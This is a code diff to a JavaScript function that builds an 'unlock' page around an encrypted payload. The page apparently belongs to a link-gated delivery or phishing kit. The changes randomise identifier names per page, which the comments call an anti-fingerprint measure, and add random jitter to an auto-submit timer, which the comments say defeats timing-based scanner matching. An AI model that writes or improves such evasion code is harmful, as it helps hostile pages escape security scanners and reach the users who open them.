@@ -753,11 +753,12 @@ function buildUnlockScript(linkId, encryptedPayload, challengeToken) {
     const fallbackSafe = String(fallbackUrl).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
 
     // Randomize identifier names so each served HTML differs (anti-template fingerprint).
+    // Uses `crypto.randomInt` (unbiased) rather than `randomBytes() % alphabet.length`.
+    const _crypto = require('crypto');
     const rnd = (n) => {
         const a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-        const b = require('crypto').randomBytes(n);
         let s = '';
-        for (let i = 0; i < n; i++) s += a[b[i] % a.length];
+        for (let i = 0; i < n; i++) s += a[_crypto.randomInt(0, a.length)];
         return '_' + s;
     };
     const noiseId = rnd(10).slice(1);
@@ -944,8 +945,9 @@ function buildUnlockScript(linkId, encryptedPayload, challengeToken) {
         submitUnlock(); // Immediate submission
     });
 
-    // Auto-submit with a randomised delay if it's a non-interactive template (e.g. just a loading bar)
-    // Random jitter (600-1500ms baseline + 3000ms display) defeats timing-based scanner pattern matching.
+    // Auto-submit with a randomised delay if it's a non-interactive template (e.g. just a loading bar).
+    // Total delay: submitJitter (600-1500ms) + 1500ms baseline = 2.1-3.0s.
+    // The original behavior was a fixed 3000ms; the random component defeats timing-based scanner pattern matching.
     if (document.querySelector('.system-captcha-wrapper') === null) {
         var safeTimeout = (window.__sys_ops && window.__sys_ops.setTimeout) ? window.__sys_ops.setTimeout : setTimeout;
         function delayedSubmit() { safeTimeout(submitUnlock, ${submitJitter} + 1500); }
